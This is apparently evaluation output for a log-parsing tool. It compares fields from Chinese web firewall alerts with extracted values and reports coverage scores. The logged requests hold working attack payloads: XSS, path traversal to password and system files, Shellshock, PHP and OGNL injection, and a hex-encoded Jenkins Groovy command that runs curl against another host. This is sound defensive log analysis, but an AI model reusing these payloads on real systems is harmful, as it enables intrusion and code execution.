+Original: [{'key': '', 'value': 'Oct 21 09:56:25'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '检测XSS攻击'}, {'key': 'URL地址', 'value': '10.50.109.2/backend/plugin/Registration/index.php?confirm=%3Cscript%3Ealert(%27openvas-xss-test%27)%3C/script%3E'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端端口', 'value': '50581'}, {'key': '动作', 'value': '告警'}, {'key': '访问唯一编号', 'value': '7428041905744647456'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:56:25'}, {'key': '', 'value': '2024-10-21 09:56:18'}, {'key': '', 'value': '09:56:18,威胁/高,事件/检测XSS攻击,请求方法/GET,URL地址/10.50.109.2/backend/plugin/Registration/index.php?confirm=%3Cscript%3Ealert(%27openvas-xss-test%27)%3C/script%3E,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/50581,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:56'}, {'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': '3Ealert'}, {'key': '', 'value': '%27openvas-xss-test%27'}]
+Coverage: 22.2%
+
+Record 26:
+Original: [{'key': '', 'value': 'Nov 18 15:16:29'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '检测常用扫描器及网络爬虫'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.90:31004/'}, {'key': '主机名', 'value': '10.50.109.90:31004'}, {'key': '服务器端口', 'value': '31004'}, {'key': '标签', 'value': '通用防护'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '攻击特征串', 'value': 'python-requests'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:16:29'}, {'key': '', 'value': '2024-11-18 15:16:17'}, {'key': '', 'value': '2024-11-18 15:16'}, {'key': '', 'value': '10.50.109.90:31004'}, {'key': '', 'value': '10.50.109.90:31004'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 27:
+Original: [{'key': '', 'value': 'Oct 21 09:50:15'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:50:09'}, {'key': '威胁', 'value': '高'}, {'key': '事件', 'value': '防空白符绕过攻击'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '动作', 'value': '告警'}, {'key': '市', 'value': '未知'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:50:15'}, {'key': '', 'value': '2024-10-21 09:50:09'}, {'key': '', 'value': '09:50:09,威胁/高,事件/防空白符绕过攻击,请求方法/GET,URL地址/10.50.109.2/awcm/includes/window_top.php?theme_file=../../../../../../../../../boot.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/36863,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:50'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 33.3%
+
+Record 28:
+Original: [{'key': '', 'value': 'Nov 18 15:16:37'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-11-18 15:16:33'}, {'key': '威胁', 'value': '中'}, {'key': 'URL地址', 'value': '10.50.109.90:31004/login'}, {'key': '服务器端口', 'value': '31004'}, {'key': '客户端环境', 'value': 'python-requests/2.12.4'}, {'key': '访问唯一编号', 'value': '7438514818418524117'}, {'key': '省', 'value': '未知'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:16:37'}, {'key': '', 'value': '2024-11-18 15:16:33'}, {'key': '', 'value': '2024-11-18 15:16'}, {'key': '', 'value': '10.50.109.90:31004'}, {'key': '', 'value': '10.50.109.90:31004'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 33.3%
+
+Record 29:
+Original: [{'key': '', 'value': 'Oct 31 20:43:20'}, {'key': '', 'value': '10.50.81.59'}, {'key': '发生时间', 'value': '2024-10-31 20:43:16'}, {'key': 'URL地址', 'value': 'hostname/static/js/../../../../../../../../../../../../../../etc/passwd'}, {'key': '服务器IP', 'value': '10.50.81.5'}, {'key': '主机名', 'value': 'hostname'}, {'key': '服务器端口', 'value': '8000'}, {'key': '客户端IP', 'value': '10.24.2.13'}, {'key': '客户端端口', 'value': '12611'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'}]
+Testing: [{'key': '', 'value': 'NT'}, {'key': '', 'value': 'like'}, {'key': '', 'value': 'Oct 31 20:43:20'}, {'key': '', 'value': '2024-10-31 20:43:16'}, {'key': '', 'value': '2024-10-31 20:43'}]
+Coverage: 20.0%
+
+Record 30:
+Original: [{'key': '', 'value': 'Nov 18 15:17:05'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-11-18 15:16:54'}, {'key': '事件', 'value': '检测PHP代码注入(语义分析)'}, {'key': '请求方法', 'value': 'POST'}, {'key': 'URL地址', 'value': '10.50.109.90:31001/vBulletin/?routestring=ajax/render/widget_php'}, {'key': 'POST数据', 'value': 'widgetConfig%5Bcode%5D=echo+md5%28%27vi8fxaLe%27%29%3B+exit%3B'}, {'key': '服务器IP', 'value': '10.50.109.90'}, {'key': '服务器端口', 'value': '31001'}, {'key': '客户端端口', 'value': '45936'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:17:05'}, {'key': '', 'value': '2024-11-18 15:16:54'}, {'key': '', 'value': '2024-11-18 15:16'}, {'key': '', 'value': '10.50.109.90:31001'}, {'key': '', 'value': '10.50.109.90:31001'}, {'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'md5'}, {'key': '', 'value': "'vi8fxaLe'"}]
+Coverage: 30.0%
+
+Record 31:
+Original: [{'key': '', 'value': 'Oct 21 09:53:36'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:53:21'}, {'key': 'URL地址', 'value': '10.50.109.2/firstvisit.php?lang_global=../../../../../../../../../etc/passwd%00'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '动作', 'value': '告警'}, {'key': 'HTTP/S', 'value': '响应码/301'}, {'key': '攻击特征串', 'value': '/firstvisit.php?lang_global=../'}, {'key': '访问唯一编号', 'value': '7428041145525998669'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:53:36'}, {'key': '', 'value': '2024-10-21 09:53:21'}, {'key': '', 'value': '09:53:21,威胁/中,事件/检测路径穿越攻击,请求方法/GET,URL地址/10.50.109.2/firstvisit.php?lang_global=../../../../../../../../../etc/passwd%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/59587,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:53'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 32:
+Original: [{'key': '', 'value': 'Oct 21 09:54:46'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:54:40'}, {'key': '事件', 'value': '检测XSS攻击'}, {'key': 'URL地址', 'value': '10.50.109.2/photos/search.php?dosearch=true&query="><script>alert(document.cookie)</script>'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端端口', 'value': '58262'}, {'key': '标签', 'value': '通用防护'}, {'key': '访问唯一编号', 'value': '7428041484838900913'}, {'key': '省', 'value': '未知'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:54:46'}, {'key': '', 'value': '2024-10-21 09:54:40'}, {'key': '', 'value': '09:54:40,威胁/高,事件/检测XSS攻击,请求方法/GET,URL地址/10.50.109.2/photos/search.php?dosearch=true&query="><script>alert(document.cookie)</script>,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/58262,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:54'}, {'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'alert'}, {'key': '', 'value': 'document.cookie'}]
+Coverage: 30.0%
+
+Record 33:
+Original: [{'key': '', 'value': 'Nov 18 15:15:28'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '中'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.90:31003/phpmyadmin/Documentation.html'}, {'key': '主机名', 'value': '10.50.109.90:31003'}, {'key': '客户端IP', 'value': '10.50.24.197'}, {'key': '动作', 'value': '阻断'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '触发规则', 'value': '10502000'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:15:28'}, {'key': '', 'value': '2024-11-18 15:15:16'}, {'key': '', 'value': '2024-11-18 15:15'}, {'key': '', 'value': '10.50.109.90:31003'}, {'key': '', 'value': '10.50.109.90:31003'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 34:
+Original: [{'key': '', 'value': 'Oct 15 01:02:17'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '高'}, {'key': '事件', 'value': '检测URL链接中文件读取'}, {'key': 'URL地址', 'value': '/nice%20ports%2C/Tri%6Eity.txt%2ebak'}, {'key': '客户端IP', 'value': '10.20.170.22'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '攻击特征串', 'value': '.bak'}, {'key': '触发规则', 'value': '10113000'}, {'key': '市', 'value': '未知'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Oct 15 01:02:17'}, {'key': '', 'value': '2024-10-15 01:02:13'}, {'key': '', 'value': '2024-10-15 01:02'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 35:
+Original: [{'key': '', 'value': 'Jun 24 09:49:55'}, {'key': '', 'value': '11.99.195.199'}, {'key': '事件', 'value': '通用代码注入攻击'}, {'key': '请求方法', 'value': 'POST'}, {'key': 'URL地址', 'value': 'aapw.nbcb.com.cn/mobilebank/api/split_wealth/function%20$n(e)%7Bthis._init(e)%7D'}, {'key': 'POST数据', 'value': 'aapw.nbcb.com.cn/mobilebank/api/split_wealth/function%20$n(e)%7Bthis._init(e)%7D,POST数据/2e928d4305c32059181c04c95e4a9d6ff4e20bf22be2945de39811be08c830aa43ff0c0ac2e6107109b8327e4117369407ee294c012e6013fd5822480057ad0843bf6a247ebc39c5284943e3812df4dc688b3b55282d2a1120e4711a5edf7759b=\\n\\n'}, {'key': '服务器IP', 'value': '11.99.72.33'}, {'key': '主机名', 'value': 'aapw.nbcb.com.cn'}, {'key': '服务器端口', 'value': '80'}, {'key': '标签', 'value': '代码注入攻击'}]
+Testing: [{'key': '', 'value': 'Jun 24 09:49:55'}, {'key': '', 'value': '2024-06-24 09:49:51'}, {'key': '', 'value': '2024-06-24 09:49'}, {'key': '', 'value': 'n'}, {'key': '', 'value': 'e'}]
+Coverage: 10.0%
+
+Record 36:
+Original: [{'key': '', 'value': 'Nov 18 15:15:59'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '高'}, {'key': '请求方法', 'value': 'GET'}, {'key': '服务器IP', 'value': '10.50.109.90'}, {'key': '主机名', 'value': '10.50.109.90:31003'}, {'key': '客户端环境', 'value': '() { :; }; echo; echo test for CVE-$((2000+14))-6271;'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '攻击特征串', 'value': '; echo test for CVE-$((2000 14))-6271;'}, {'key': '触发规则', 'value': '10190000'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'echo'}, {'key': '', 'value': 'test'}, {'key': '', 'value': 'for'}, {'key': '', 'value': 'echo'}, {'key': '', 'value': 'test'}, {'key': '', 'value': 'for'}, {'key': '', 'value': 'Nov 18 15:15:59'}, {'key': '', 'value': '2024-11-18 15:15:43'}, {'key': '', 'value': '2024-11-18 15:15'}, {'key': '', 'value': '10.50.109.90:31003'}, {'key': '', 'value': '10.50.109.90:31003'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 37:
+Original: [{'key': '', 'value': 'Oct 21 09:51:39'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '高'}, {'key': 'URL地址', 'value': '10.50.109.2/cgi-bin/faqmanager.cgi?toc=/windows/win.ini%00'}, {'key': '服务器端口', 'value': '80'}, {'key': '客户端端口', 'value': '38978'}, {'key': '标签', 'value': '通用防护'}, {'key': '动作', 'value': '告警'}, {'key': 'HTTP/S', 'value': '响应码/301'}, {'key': '攻击特征串', 'value': '/windows/win.ini'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:51:39'}, {'key': '', 'value': '2024-10-21 09:51:27'}, {'key': '', 'value': '09:51:27,威胁/高,事件/检测通用文件读取,请求方法/GET,URL地址/10.50.109.2/cgi-bin/faqmanager.cgi?toc=/windows/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/38978,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:51'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 38:
+Original: [{'key': '', 'value': 'Oct 21 09:49:36'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:49:29'}, {'key': '事件', 'value': '检测路径穿越攻击'}, {'key': 'URL地址', 'value': '10.50.109.2/gallo/core/includes/gfw_smarty.php?config[gfwroot]=../../../../../../../../../boot.ini%00'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '客户端端口', 'value': '60502'}, {'key': '标签', 'value': '通用防护'}, {'key': 'HTTP/S', 'value': '响应码/301'}, {'key': '攻击特征串', 'value': '/gallo/core/includes/gfw_smarty.php?config[gfwroot]=../'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:49:36'}, {'key': '', 'value': '2024-10-21 09:49:29'}, {'key': '', 'value': '09:49:29,威胁/中,事件/检测路径穿越攻击,请求方法/GET,URL地址/10.50.109.2/gallo/core/includes/gfw_smarty.php?config[gfwroot]=../../../../../../../../../boot.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/60502,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:49'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 39:
+Original: [{'key': '', 'value': 'Oct 31 20:34:13'}, {'key': '', 'value': '10.50.81.59'}, {'key': '威胁', 'value': '高'}, {'key': '事件', 'value': '通用代码注入攻击'}, {'key': '主机名', 'value': 'hostname'}, {'key': '客户端端口', 'value': '57640'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '攻击特征串', 'value': '%27%3Btop%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B//'}, {'key': '触发规则', 'value': '12032010'}, {'key': '访问唯一编号', 'value': '7431917130176530899'}]
+Testing: [{'key': '', 'value': 'NT'}, {'key': '', 'value': 'like'}, {'key': '', 'value': 'Oct 31 20:34:13'}, {'key': '', 'value': '2024-10-31 20:34:09'}, {'key': '', 'value': '2024-10-31 20:34'}]
+Coverage: 10.0%
+
+Record 40:
+Original: [{'key': '', 'value': 'Oct 21 09:51:39'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '中'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.2/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=../../../../../../../../../../../../../windows/win.ini%00'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': '服务器端口', 'value': '80'}, {'key': '攻击特征串', 'value': '/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=../'}, {'key': '触发规则', 'value': '10350000'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:51:39'}, {'key': '', 'value': '2024-10-21 09:51:27'}, {'key': '', 'value': '09:51:27,威胁/中,事件/检测路径穿越攻击,请求方法/GET,URL地址/10.50.109.2/assets/plugins/mp3_id/mp3_id.php?GLOBALS[BASE]=../../../../../../../../../../../../../windows/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/58494,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:51'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 22.2%
+
+Record 41:
+Original: [{'key': '', 'value': 'Nov 18 15:17:29'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-11-18 15:17:1'}, {'key': '威胁', 'value': '高'}, {'key': '事件', 'value': '检测通用文件读取'}, {'key': '请求方法', 'value': 'GET'}, {'key': '服务器端口', 'value': '31004'}, {'key': '客户端环境', 'value': 'Mozilla/4.75 [en] (X11, U;)'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '攻击特征串', 'value': '../../../../../../../../../../etc/passwd'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:17:29'}, {'key': '', 'value': '2024-11-18 15:17:19'}, {'key': '', 'value': '15:17:19,威胁/高,事件/检测通用文件读取,请求方法/GET,URL地址/10.50.109.90/cgi-bin/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd,POST数据/,服务器IP/10.50.109.90,主机名/10.50.109.90,服务器端口/31004,客户端IP/10.50.24.197,客户端端口/43426,客户端环境/Mozilla/4.75'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-11-18 15:17'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 42:
+Original: [{'key': '', 'value': 'Oct 21 09:51:38'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '防空白符绕过攻击'}, {'key': 'URL地址', 'value': '10.50.109.2/productionnu2/fileuploader.php?dir=../../../../../../../../../../../windows/win.ini%00'}, {'key': '主机名', 'value': '10.50.109.2'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '标签', 'value': '协议限制'}, {'key': '访问唯一编号', 'value': '7428040630136214381'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:51:38'}, {'key': '', 'value': '2024-10-21 09:51:21'}, {'key': '', 'value': '09:51:21,威胁/高,事件/防空白符绕过攻击,请求方法/GET,URL地址/10.50.109.2/productionnu2/fileuploader.php?dir=../../../../../../../../../../../windows/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/47950,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:51'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 43:
+Original: [{'key': '', 'value': 'Nov 18 15:17:06'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '高'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.90/cgi-bin/php.cgi?/etc/passwd'}, {'key': '客户端端口', 'value': '44444'}, {'key': '客户端环境', 'value': 'Mozilla/4.75 [en] (X11, U;)'}, {'key': '标签', 'value': '通用防护'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '攻击特征串', 'value': '/etc/passwd'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:17:06'}, {'key': '', 'value': '2024-11-18 15:17:02'}, {'key': '', 'value': '15:17:02,威胁/高,事件/检测通用文件读取,请求方法/GET,URL地址/10.50.109.90/cgi-bin/php.cgi?/etc/passwd,POST数据/,服务器IP/10.50.109.90,主机名/10.50.109.90,服务器端口/31004,客户端IP/10.50.24.197,客户端端口/44444,客户端环境/Mozilla/4.75'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-11-18 15:17'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 20.0%
+
+Record 44:
+Original: [{'key': '', 'value': 'Oct 21 09:49:06'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:49:00'}, {'key': '事件', 'value': '防空白符绕过攻击'}, {'key': 'URL地址', 'value': '10.50.109.2/index.php?p=../../../../../../../../../../boot.ini%00'}, {'key': '服务器端口', 'value': '80'}, {'key': '客户端IP', 'value': '10.50.86.35'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 [en] (X11, U; DBAPPSecurity 21.4.3)'}, {'key': '访问唯一编号', 'value': '7428040024542679637'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:49:06'}, {'key': '', 'value': '2024-10-21 09:49:00'}, {'key': '', 'value': '09:49:00,威胁/高,事件/防空白符绕过攻击,请求方法/GET,URL地址/10.50.109.2/index.php?p=../../../../../../../../../../boot.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/42024,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:49'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 45:
+Original: [{'key': '', 'value': 'Oct 21 09:50:15'}, {'key': '', 'value': '9:50:15'}, {'key': '事件', 'value': '防空白符绕过攻击'}, {'key': 'URL地址', 'value': '10.50.109.2/awcm/includes/window_top.php?theme_file=../../../../../../../../../windows/win.ini%00'}, {'key': '主机名', 'value': '10.50.109.2'}, {'key': '服务器端口', 'value': '80'}, {'key': '动作', 'value': '告警'}, {'key': 'HTTP/S', 'value': '响应码/301'}, {'key': '攻击特征串', 'value': '/awcm/includes/window_top.php?theme_file=../../../../../../../../../windows/win.ini'}, {'key': '国家', 'value': '局域网'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:50:15'}, {'key': '', 'value': '2024-10-21 09:50:05'}, {'key': '', 'value': '09:50:05,威胁/高,事件/防空白符绕过攻击,请求方法/GET,URL地址/10.50.109.2/awcm/includes/window_top.php?theme_file=../../../../../../../../../windows/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/40146,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:50'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 10.0%
+
+Record 46:
+Original: [{'key': '', 'value': 'Nov 18 15:16:00'}, {'key': '', 'value': '10-50-86-12'}, {'key': '威胁', 'value': '中'}, {'key': '请求方法', 'value': 'GET'}, {'key': 'URL地址', 'value': '10.50.109.90:31004/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=True&value=public+class+x%7Bpublic+x%28%29%7Bnew+String%28%226375726c20687474703a2f2f31302e35302e32342e3139373a36333035332f7178316737547759%22.decodeHex%28%29%29.execute%28%29%7D%7D'}, {'key': '主机名', 'value': '10.50.109.90:31004'}, {'key': '客户端端口', 'value': '55122'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '触发规则', 'value': '10502000'}, {'key': '访问唯一编号', 'value': '7438514607969320161'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'Nov 18 15:16:00'}, {'key': '', 'value': '2024-11-18 15:15:44'}, {'key': '', 'value': '2024-11-18 15:15'}, {'key': '', 'value': '10.50.109.90:31004'}, {'key': '', 'value': '10.50.109.90:31004'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 47:
+Original: [{'key': '', 'value': 'Nov  4 11:40:03'}, {'key': '', 'value': '10.50.81.59'}, {'key': '事件', 'value': '文件限制'}, {'key': '客户端IP', 'value': '10.50.35.138'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '攻击特征串', 'value': '.bak'}, {'key': '触发规则', 'value': '11060006'}, {'key': '访问唯一编号', 'value': '7433263817181626368'}, {'key': '国家', 'value': 'LAN'}]
+Testing: [{'key': '', 'value': 'NT'}, {'key': '', 'value': 'like'}, {'key': '', 'value': '2024-11-04 11:39:59'}, {'key': '', 'value': '2024-11-04 11:39'}]
+Coverage: 0.0%
+
+Record 48:
+Original: [{'key': '', 'value': 'Sep 25 10:19:23'}, {'key': '', 'value': '10-50-86-12'}, {'key': '事件', 'value': '检测OGNL注入'}, {'key': '请求方法', 'value': 'POST'}, {'key': 'URL地址', 'value': '10.50.109.151:8888/struts2-blank-2.3.28/example/HelloWorld.action'}, {'key': '主机名', 'value': '10.50.109.151:8888'}, {'key': '服务器端口', 'value': '8888'}, {'key': '客户端环境', 'value': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}, {'key': 'HTTP/S', 'value': '响应码/403'}, {'key': '攻击特征串', 'value': "%25{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl."}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'NT'}, {'key': '', 'value': 'like'}, {'key': '', 'value': 'Sep 25 10:19:23'}, {'key': '', 'value': '2024-09-25 10:19:11'}, {'key': '', 'value': '2024-09-25 10:19'}, {'key': '', 'value': '10.50.109.151:8888'}, {'key': '', 'value': '10.50.109.151:8888'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 30.0%
+
+Record 49:
+Original: [{'key': '', 'value': 'Oct 21 09:49:06'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-10-21 09:48:58'}, {'key': 'URL地址', 'value': '10.50.109.2/index.php?p=../../../../../../../../../../windows/win.ini%00'}, {'key': '服务器IP', 'value': '10.50.109.2'}, {'key': 'HTTP/S', 'value': '响应码/301'}, {'key': '访问唯一编号', 'value': '7428040015955890765'}, {'key': '国家', 'value': '局域网'}, {'key': '市', 'value': '未知'}]
+Testing: [{'key': '', 'value': '10-50-86-12'}, {'key': '', 'value': 'DBAPPSecurity'}, {'key': '', 'value': 'Oct 21 09:49:06'}, {'key': '', 'value': '2024-10-21 09:48:58'}, {'key': '', 'value': '09:48:58,威胁/中,事件/检测路径穿越攻击,请求方法/GET,URL地址/10.50.109.2/index.php?p=../../../../../../../../../../windows/win.ini%00,POST数据/,服务器IP/10.50.109.2,主机名/10.50.109.2,服务器端口/80,客户端IP/10.50.86.35,客户端端口/46382,客户端环境/Mozilla/5.0'}, {'key': '', 'value': 'en'}, {'key': '', 'value': '2024-10-21 09:48'}, {'key': '', 'value': '10-50-86-12'}]
+Coverage: 33.3%
+
+Record 50:
+Original: [{'key': '', 'value': 'Nov 18 15:16:01'}, {'key': '', 'value': '10-50-86-12'}, {'key': '发生时间', 'value': '2024-11-18 15:15:46'}, {'key': '事件', 'value': '检测Unix命令注入(part1)'}, {'key': 'URL地址', 'value': '10.50.109.90:31003/cgi-bin/user_login'}, {'key': '服务器IP', 'value': '10.50.109.90'}, {'key': '服务器端口', 'value': '31003'}, {'key': '客户端IP', 'value': '10.50.24.197'}, {'key': '客户端端口', 'value': '52482'}, {'key': '客户端环境', 'value': '() { :; }; echo; echo test for CVE-$((2000+14))-6271;'}]
